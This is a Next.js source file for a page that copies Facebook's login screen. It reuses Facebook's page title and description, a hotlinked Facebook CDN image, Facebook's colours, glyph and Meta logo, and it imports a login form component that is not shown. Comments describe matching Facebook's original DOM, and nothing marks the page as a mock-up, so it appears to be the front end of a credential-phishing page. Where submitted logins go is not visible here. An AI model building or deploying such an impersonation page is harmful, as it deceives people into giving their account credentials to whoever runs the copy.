import type { CSSProperties } from 'react'
import type { Metadata } from 'next'
import Image from 'next/image'
import Link from 'next/link'

import { FbLoginForm } from './FbLoginForm'

export const metadata: Metadata = {
  title: 'Facebook',
  description: 'Log in to Facebook to connect and share with the people in your life.',
}

/** Collage trong DOM Facebook (CAA logged-out homepage) */
const FB_COLLAGE_WEBP =
  'https://static.xx.fbcdn.net/rsrc.php/y0/r/U45qBJmWVHU.webp'

/** Theo `:root`/light mode trong HTML Facebook (`__fb-light-mode`) */
const FB_VARS = {
  primaryText: '#111112',
  secondaryText: '#666A72',
  blueLink: '#0064E0',
  fbLogo: '#0866FF',
  fbWordmark: '#1877F2',
  divider: '#DFE2E5',
  surface: '#FFFFFF',
  primaryBtn: '#0064E0',
  /** Nút đăng ký phổ biến trên trang đăng nhập web cổ điển */
  regGreen: '#42b72a',
} as const

const fbFont =
  'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif'

/** Glyph Facebook `fill="currentColor"` như SVG trong source */
function FbGlyph({ className }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 24 24"
      fill="currentColor"
      width="1em"
      height="1em"
      className={className}
      aria-hidden
    >
      <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z" />
    </svg>
  )
}

export default function FacebookLoginPage() {
  return (
    <div
      className="__fb-light-mode min-h-[100dvh] antialiased [-webkit-font-smoothing:antialiased]"
      dir="ltr"
      lang="en"
      style={
        {
          fontFamily: fbFont,
          color: FB_VARS.primaryText,
          backgroundColor: FB_VARS.surface,
          /* Tập biến con dùng trực tiếp trong style inline / cascade */
          ['--fds-primary-text' as string]: FB_VARS.primaryText,
          ['--fds-secondary-text' as string]: FB_VARS.secondaryText,
          ['--blue-link' as string]: FB_VARS.blueLink,
          ['--primary-button-background' as string]: FB_VARS.primaryBtn,
          ['--fb-logo' as string]: FB_VARS.fbLogo,
          ['--divider' as string]: FB_VARS.divider,
          ['--headline3-font-size' as string]: '1.0625rem',
          ['--headline3-line-height' as string]: '1.2941',
          ['--headline3-font-weight' as string]: '600',
          ['--web-wash' as string]: FB_VARS.surface,
        } as CSSProperties
      }
    >
      <div className="mx-auto flex min-h-[100dvh] max-w-[1920px] flex-col lg:min-h-screen lg:flex-row">
        {/* Cột hero: mọi breakpoint — thứ tự giống DOM (icon + slogan → ảnh → khoảng trống) */}
        <section
          className="flex w-full flex-col px-5 pb-2 pt-7 sm:px-7 sm:pt-8 lg:min-h-screen lg:flex-[0_0_58%] lg:justify-start lg:px-[4.25rem] lg:pb-10 lg:pt-10 xl:pl-[4.75rem] xl:pr-12"
          style={{ backgroundColor: FB_VARS.surface }}
        >
          <div className="flex max-w-[min(100%,720px)] flex-row items-start gap-3 sm:gap-4 lg:gap-5">
            <div
              className="shrink-0 pt-[0.2em] text-[2.5rem] sm:text-[2.75rem] lg:text-[2.625rem]"
              style={{ color: FB_VARS.fbLogo }}
            >
              <FbGlyph className="block" />
            </div>
            <p
              className="min-w-0 flex-1 font-bold tracking-[-0.038em]"
              style={{
                color: FB_VARS.primaryText,
                fontSize: 'clamp(2rem, 1.5vw + 1.35rem, 3.375rem)',
                lineHeight: 'clamp(2.5rem, 1.2em + 1rem, 4.125rem)',
              }}
            >
              Explore the things{' '}
              <span style={{ color: FB_VARS.fbWordmark }}>you love</span>
              <span style={{ color: FB_VARS.primaryText }}>.</span>
            </p>
          </div>

          <div className="relative mt-5 w-full sm:mt-6 lg:mt-8 lg:flex lg:min-h-0 lg:flex-1 lg:items-center lg:py-4">
            <div className="relative mx-auto h-[min(52vh,480px)] w-full max-w-[min(100%,400px)] sm:h-[min(54vh,520px)] sm:max-w-[460px] lg:h-[min(72vh,820px)] lg:max-w-[min(100%,680px)]">
              <Image
                src={FB_COLLAGE_WEBP}
                alt=""
                fill
                sizes="(max-width: 1024px) 92vw, min(680px, 58vw)"
                className="object-contain object-center"
                priority
              />
            </div>
          </div>

          {/* Lớp trống tương đương `<div></div>` giữa hero và form trên bản gốc */}
          <div className="h-3 shrink-0 sm:h-4 lg:h-6" aria-hidden />
        </section>

        <div
          className="hidden w-px shrink-0 self-stretch lg:block"
          style={{ backgroundColor: FB_VARS.divider }}
          aria-hidden
        />

        <aside
          className="flex w-full flex-1 flex-col border-t lg:min-h-screen lg:max-w-none lg:min-w-0 lg:flex-[0_0_42%] lg:border-t-0"
          style={{
            borderColor: FB_VARS.divider,
            backgroundColor: FB_VARS.surface,
          }}
        >
          <div className="mx-auto flex w-full max-w-[396px] flex-1 flex-col px-5 pb-9 pt-5 sm:px-7 lg:min-h-screen lg:justify-between lg:px-12 lg:pb-12 lg:pt-14 xl:px-14">
            <div className="flex flex-1 flex-col lg:justify-center lg:pt-4">
              <h1
                className="text-center tracking-[-0.012em]"
                style={{
                  color: FB_VARS.primaryText,
                  fontSize: 'var(--headline3-font-size)',
                  lineHeight: 'var(--headline3-line-height)',
                  fontWeight: 600,
                }}
              >
                Log in to Facebook
              </h1>

              <FbLoginForm />

              <nav className="mt-3 text-center" aria-label="Account help">
                <Link
                  href="#"
                  className="inline-block text-[0.9375rem] font-medium leading-[1.2667] hover:underline"
                  style={{ color: FB_VARS.blueLink }}
                >
                  Forgotten password?
                </Link>
              </nav>
            </div>

            <div className="mt-10 flex w-full flex-col items-stretch lg:mt-8 lg:shrink-0">
              <Link
                href="#"
                className="flex h-11 w-full shrink-0 items-center justify-center rounded-md text-[1.0625rem] font-semibold leading-tight text-white transition-colors hover:bg-[#36a420] active:bg-[#2b9217]"
                style={{ backgroundColor: FB_VARS.regGreen }}
              >
                Create new account
              </Link>

              <div className="mt-8 flex justify-center pb-1 lg:mt-10">
                <Image
                  src="/images/meta/logo-meta.svg"
                  alt="Meta"
                  width={132}
                  height={26}
                  className="h-[26px] w-auto max-w-[min(100%,148px)] object-contain object-center opacity-[0.98]"
                />
              </div>
            </div>
          </div>
        </aside>
      </div>
    </div>
  )
}
